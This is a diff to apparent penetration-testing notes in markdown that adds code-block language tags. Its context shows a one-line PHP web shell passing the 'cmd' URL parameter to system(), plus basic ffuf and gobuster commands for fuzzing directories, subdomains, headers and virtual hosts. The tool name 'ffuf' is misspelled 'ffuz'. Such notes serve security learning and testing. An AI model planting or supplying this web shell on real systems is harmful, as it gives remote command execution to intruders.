@@ -8,7 +8,7 @@ Automated tool for misconfigs, clear-text creds and others: https://github.com/c
 Good dictionaries: https://github.com/danielmiessler/SecLists
 
 Very simple php shell:
-```
+```php
 <?php 
     if(isset($_GET['cmd'])) { 
     system($_GET['cmd']); 
@@ -27,20 +27,28 @@ PHP check if funny features are enabled or not:
 Basic ffuf use:
 
 Fuzzes subdirectories.
+```bash
 ffuz -w (wordlist) -u http(s)://domainname.com/FUZZ
+```
 
 Fuzzes subdomains.
+```bash
 ffuz -w (wordlist) -u http(s)://FUZZ.domainname.com
+```
 
 Fuzz an HTTP header.
+```bash
 ffuz -w (wordlist) -u http(s)://domainname.com -H "Cookie: FUZZ"
-
+```
 
 Basic gobuster use:
 
 Check for subdirectories.
+```bash
 gobuster dir -w (wordlist) -u http(s)://domainname.com/
+```
 
 Checks for virtualhosts (S3 buckets and more).
+```bash
 gobuster vhost -w (wordlist) -d http(s)://domainname.com/
-
+```
